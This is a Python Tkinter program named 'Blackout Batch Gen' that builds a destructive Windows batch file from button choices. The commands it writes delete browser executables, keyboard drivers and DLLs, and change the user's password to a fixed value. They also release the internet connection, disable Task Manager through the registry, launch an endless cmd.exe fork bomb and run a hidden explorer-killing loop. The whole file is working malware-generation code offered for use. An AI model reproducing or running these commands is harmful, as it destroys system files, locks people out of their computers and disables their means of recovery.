from Tkinter import *
from tkMessageBox import *

master = Tk()

#Create file + write @echo off
print 'New File Created'
filename= "Gen'd.txt"
file = open(filename, 'w')
file.write("@echo off\n")

#Menu Bar Functions
def Help():
    showinfo("Help", "Visit  http://zacaj.com/spy/blackout  for help.")
def Save():
    print '**File Saved + Closed**'
    showinfo("Saved", "The File has been saved and closed")
    file.close()
def About():
    showinfo("About", "Created By Spy \n Idea by The Guild Of Calamitous Intent \n Dedicated to D.S. Inc.")

#Button Functions
def browserkill():
    print "Added 'Delete Browsers'"
    file.write('echo cd C:\Program Files\Internet Explorer >> "hid.bat"\n')
    file.write('echo del IEXPLORE.exe >> "hid.bat"\n')
    file.write('echo cd C:\Program Files\Mozilla Firefox >> "hid.bat"\n')
    file.write('echo del firefox.exe >> "hid.bat"\n')
    file.write('echo cd C:\Documents and Settings\%username%\Local Settings\Application Data\Google\Chrome\Application >> "hid.bat"\n')
    file.write('echo del chrome.exe >> "hid.bat"\n')
    file.write('echo cd C:\Users\%username%\AppData\Local\Google\Chrome\Application >> "hid.bat"\n')
    file.write('echo del chrome.exe >> "hid.bat"\n')
    file.write('echo exit >> "hid.bat"\n')
    file.write('start hid.bat \n')
    file.write('del hid.bat \n')
def mouseswap():
    print "Added 'Swap Mouse Buttons'"
    file.write('RUNDLL32 USER32.DLL,SwapMouseButton \n')
def pwchange():
    print "Added 'Change Password'"
    file.write('net user %username% N3v3rGu355 \n')
def intrdis():
    print "Added 'Disable Internet'"
    file.write('ipconfig /release \n')
    file.write('if ERRORLEVEL1 ipconfig /release_all \n')
def keydis():
    print "Added 'Disable Keybord'"
    file.write('cd %windir%\system32 \n')
    file.write('del /S /F /Q keyboard.drv \n')
    file.write('del /S /F /Q keyboard.sys \n')
def tskdis():
    print "Added 'Disable Task Manager'"
    file.write('ECHO REGEDIT4 > %WINDIR%\DXM.REG \n')
    file.write('echo. >> %WINDIR%\DXM.reg \n')
    file.write('echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg \n')
    file.write('echo "DisableTaskMgr"=dword:2 >> %WINDIR%\DXM.reg \n')
    file.write('echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg \n')
    file.write('echo "DisableTaskMgr"=dword:2 >> %WINDIR%\DXM.reg \n')
    file.write('start /w regedit /s %WINDIR%\DXM.reg \n')
def loopbomb():
    print "Added 'Loop Bomb'"
    file.write('echo @echo off >> loop.bat \n')
    file.write('echo :loop >> loop.bat \n')
    file.write('echo start cmd.exe >> loop.bat \n')
    file.write('echo goto loop >> loop.bat \n')
    file.write('start loop.bat \n')
def deldll():
    print "Added 'Delete DLLs'"
    file.write('del *.dll \n')
def killexplorer():
    print "Added 'Kill Explorer'"
    file.write('echo :a >>explorer.bat \n')
    file.write('echo tskill explorer >>explorer.bat \n')
    file.write('echo goto a >>explorer.bat \n')
    file.write('echo Set objShell = CreateObject("WScript.Shell")>>invisi.vbs \n')
    file.write('echo strCommand = "explorer.bat">>invisi.vbs \n')
    file.write('echo objShell.Run strCommand, vbHide, TRUE>>invisi.vbs \n')
    file.write('start "" invisi.vbs \n')
    

#Menu
menubar = Menu(master)
menubar.add_command(label="Save", command=Save)
menubar.add_command(label="Help", command=Help)
menubar.add_command(label="About", command=About)
menubar.add_command(label="Quit", command=master.quit)
master.config(menu=menubar)

#Buttons
maintxt = Label(master, text="Blackout Batch Gen")
maintxt.pack(side=TOP)

browserkill = Button(master, text="Delete Browsers", width=23, fg="blue", command=browserkill)
browserkill.pack(side=TOP)

mouseswap = Button(master, text="Swap Mouse Buttons", width=23, fg="blue", command=mouseswap)
mouseswap.pack(side=TOP)

pwchange = Button(master, text="Change Password", width=23, fg="blue", command=pwchange)
pwchange.pack(side=TOP)

intrdis = Button(master, text="Disable Internet", width=23, fg="blue", command=intrdis)
intrdis.pack(side=TOP)

keydis = Button(master, text="Disable Keybord", width=23, fg="blue", command=keydis)
keydis.pack(side=TOP)

tskdis = Button(master, text="Disable Task Manager", width=23, fg="blue", command=tskdis)
tskdis.pack(side=TOP)

deldll = Button(master, text="Delete DLLs", width=23, fg="blue", command=deldll)
deldll.pack(side=TOP)

loopbomb = Button(master, text="Loop Bomb", width=23, fg="blue", command=loopbomb)
loopbomb.pack(side=TOP)

killexplorer = Button(master, text="Kill Explorer", width=23, fg="blue", command=killexplorer)
killexplorer.pack(side=TOP)

mainloop()

